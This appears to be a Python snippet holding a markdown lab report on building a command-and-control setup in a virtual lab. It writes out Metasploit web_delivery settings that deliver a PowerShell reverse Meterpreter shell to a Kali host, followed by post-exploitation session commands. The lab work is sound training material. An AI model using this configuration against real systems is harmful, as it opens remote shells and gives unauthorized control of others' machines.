from pathlib import Path

content = """# Advanced C2 Lab

## Objective
The objective of this lab was to establish a Command-and-Control (C2) infrastructure, generate and deliver a PowerShell payload, establish a remote session with a Windows virtual machine, and perform post-exploitation interaction using a C2 framework.

---

# Tools Used

- PoshC2 (initial setup attempt)
- Metasploit Framework
- Kali Linux
- Windows 11 Virtual Machine
- PowerShell
- Meterpreter

---

# PoshC2 Attempt

Initial attempts were made using PoshC2. During installation and configuration, dependency and compatibility issues related to modern Kali Linux Python environments prevented stable execution of the framework.

Issues encountered included:
- pipenv dependency problems
- OpenSSL module errors
- Python virtual environment compatibility issues

Due to these problems, Metasploit Framework was used as an alternative Command-and-Control solution to complete the lab objectives successfully.

---

# Lab Environment

| Machine | Role | IP Address |
|---|---|---|
| Kali Linux VM | Attacker/C2 Server | 192.168.56.105 |
| Windows 11 VM | Target Machine | 192.168.56.106 |

---

# C2 Infrastructure Configuration

Metasploit Framework was launched using:

```bash
msfconsole
The web_delivery module was configured:

use exploit/multi/script/web_delivery
set TARGET 2
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.105
set LPORT 443
run
```

---

# Payload Delivery

The generated PowerShell launcher command was executed on the Windows 11 virtual machine using administrative PowerShell privileges.

This established a reverse Meterpreter session from the target machine back to the Kali Linux attacker machine.

---

# Session Establishment

Successful Meterpreter interaction commands:

```
sessions
sessions -i 1
sysinfo
getuid
ipconfig
```
---

# Results

The Command-and-Control infrastructure was successfully established using Metasploit Framework. A PowerShell payload was delivered to the Windows 11 target system, resulting in a successful reverse Meterpreter session.

Remote command execution and system enumeration were completed successfully.

---
